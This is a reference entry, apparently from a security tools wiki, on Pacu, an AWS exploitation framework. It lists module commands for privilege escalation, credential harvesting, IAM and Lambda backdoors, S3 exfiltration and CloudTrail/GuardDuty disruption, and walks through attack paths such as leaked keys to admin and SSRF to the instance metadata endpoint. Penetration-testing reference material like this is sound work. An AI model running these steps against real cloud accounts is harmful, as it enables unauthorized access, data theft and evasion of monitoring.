---
id: "pacu"
title: "Pacu - AWS Exploitation Framework"
type: "tool"
category: "cloud"
subcategory: "aws"
tags: ["aws", "cloud", "pacu", "iam", "s3", "ec2", "lambda", "privilege-escalation", "exploitation"]
difficulty: "intermediate"
platforms: ["linux", "macos"]
source_url: "https://github.com/RhinoSecurityLabs/pacu"
related: ["truffleHog", "s3scanner"]
updated: "2026-04-14"
---

## Overview

Pacu is the Metasploit equivalent for AWS. Open-source exploitation framework by Rhino Security Labs for testing AWS environment security. Modular architecture covering enumeration, privilege escalation, data exfiltration, service exploitation, persistence, and log manipulation. Uses local SQLite database to minimize API calls and associated CloudTrail logs.

## Installation

```bash
# Clone and install
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
pip3 install -r requirements.txt

# Or pip install
pip3 install pacu

# Launch
python3 pacu.py

# Kali Linux
sudo apt install pacu
```

## Initial Setup

```bash
# Start Pacu
python3 pacu.py

# Create new session
Pacu> set_keys

# Enter AWS keys
# Key alias: target-account
# AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
# AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Or import from AWS CLI profile
Pacu> import_keys default

# Confirm identity
Pacu> whoami

# List all available modules
Pacu> list
Pacu> search privesc
Pacu> search enum
```

## Key Modules by Attack Phase

### Enumeration

```bash
# IAM enumeration
Pacu> run iam__enum_users_roles_policies_groups
Pacu> run iam__enum_permissions
Pacu> run iam__enum_users

# EC2 enumeration
Pacu> run ec2__enum

# S3 enumeration
Pacu> run s3__enum

# Lambda enumeration
Pacu> run lambda__enum

# All services overview
Pacu> run aws__enum_account
Pacu> run aws__enum_spend

# Secrets Manager
Pacu> run enum__secrets

# RDS enumeration
Pacu> run rds__enum

# ECS enumeration
Pacu> run ecs__enum

# Elastic Beanstalk secrets
Pacu> run ebs__enum_secrets
```

### Privilege Escalation

```bash
# Scan for privesc paths (CRITICAL MODULE)
Pacu> run iam__privesc_scan

# This module:
# 1. Enumerates current permissions
# 2. Identifies 21+ known privesc paths
# 3. Presents exploitable paths
# 4. Can execute the escalation automatically

# Known privesc vectors include:
# - CreateNewPolicyVersion
# - SetExistingDefaultPolicyVersion
# - CreateEC2WithExistingIP
# - CreateAccessKey
# - CreateLoginProfile
# - UpdateLoginProfile
# - AttachUserPolicy / AttachGroupPolicy / AttachRolePolicy
# - PutUserPolicy / PutGroupPolicy / PutRolePolicy
# - AddUserToGroup
# - UpdateAssumeRolePolicy
# - PassRole + CreateFunction + InvokeFunction (Lambda)
# - PassRole + EC2 instance
# - EditExistingLambdaFunctionWithRole
# - CodeStarCreateProjectThenAssociateTeamMember
```

### Credential Harvesting

```bash
# EC2 instance metadata / user data
Pacu> run ec2__download_userdata
# User data scripts often contain hardcoded credentials

# Lambda environment variables
Pacu> run lambda__enum
# Lambda functions often store secrets in env vars

# Secrets Manager
Pacu> run enum__secrets

# SSM Parameter Store
Pacu> run ssm__download_parameters

# CodeBuild environment variables
Pacu> run codebuild__enum
```

### Persistence

```bash
# Lambda backdoor
Pacu> run lambda__backdoor_new_users
Pacu> run lambda__backdoor_new_roles
Pacu> run lambda__backdoor_new_sec_groups

# IAM backdoor
Pacu> run iam__backdoor_users_keys
Pacu> run iam__backdoor_users_password
Pacu> run iam__backdoor_assume_role

# EC2 backdoor
Pacu> run ec2__backdoor_ec2_sec_groups
```

### Data Exfiltration

```bash
# S3 data access
Pacu> run s3__download_bucket

# RDS snapshots
Pacu> run rds__explore_snapshots

# EBS snapshots
Pacu> run ebs__explore_snapshots

# DynamoDB
Pacu> run dynamodb__enum
```

### Lateral Movement

```bash
# Assume roles
Pacu> run iam__enum_roles
# Then attempt to assume discovered roles

# Cross-account access
Pacu> run iam__enum_assume_role

# SSM command execution on EC2
Pacu> run ssm__command_execution
```

### Defense Evasion

```bash
# CloudTrail disruption
Pacu> run cloudtrail__download_event_history
Pacu> run detection__disruption

# GuardDuty evasion
Pacu> run detection__enum_services

# Config disruption
Pacu> run detection__disruption
```

## Session Management

```bash
# List sessions
Pacu> list_sessions

# Switch session
Pacu> swap_session

# Session data persists in SQLite
# All enumerated data cached locally
# Minimizes repeat API calls and CloudTrail entries

# View collected data
Pacu> data IAM
Pacu> data EC2
Pacu> data S3
```

## Common Attack Paths

### Path 1: Leaked Keys -> Admin
```bash
# 1. Start with leaked AWS keys
set_keys
whoami

# 2. Enumerate permissions
run iam__enum_permissions

# 3. Check for privesc
run iam__privesc_scan

# 4. Escalate (Pacu handles execution)
# 5. Enumerate everything with elevated access
run ec2__enum
run s3__enum
run lambda__enum
```

### Path 2: EC2 SSRF -> Credential Theft
```bash
# 1. SSRF to metadata endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 2. Get temporary credentials from role
# 3. Import into Pacu
set_keys

# 4. Enumerate what the EC2 role can access
run iam__enum_permissions
run s3__enum
```

### Path 3: Lambda -> Secrets
```bash
# 1. Enumerate Lambda functions
run lambda__enum

# 2. Check environment variables for secrets
# 3. Check function code for hardcoded credentials
# 4. Use found credentials for further access
```

## Integration with Other Tools

### With AWS CLI
```bash
# Pacu imports AWS CLI profiles
Pacu> import_keys profile_name
```

### With TruffleHog/GitLeaks
```bash
# Find leaked keys with trufflehog
trufflehog github --org=target-org
# Import found keys into Pacu for validation and exploitation
```

### With ScoutSuite / Prowler
```bash
# Use ScoutSuite/Prowler for defensive audit
# Use Pacu for offensive exploitation of findings
```

## Pro Tips

- Always start with `whoami` and `iam__enum_permissions`
- `iam__privesc_scan` is the single most valuable module
- EC2 user data frequently contains hardcoded credentials
- Lambda environment variables are a goldmine for secrets
- Pacu caches data locally - minimizes CloudTrail footprint
- Use `data` command to review all collected intelligence
- Check for cross-account role assumptions
- SSM Parameter Store often has unencrypted secrets
- Always check for overly permissive S3 bucket policies
- Elastic Beanstalk environments frequently leak secrets
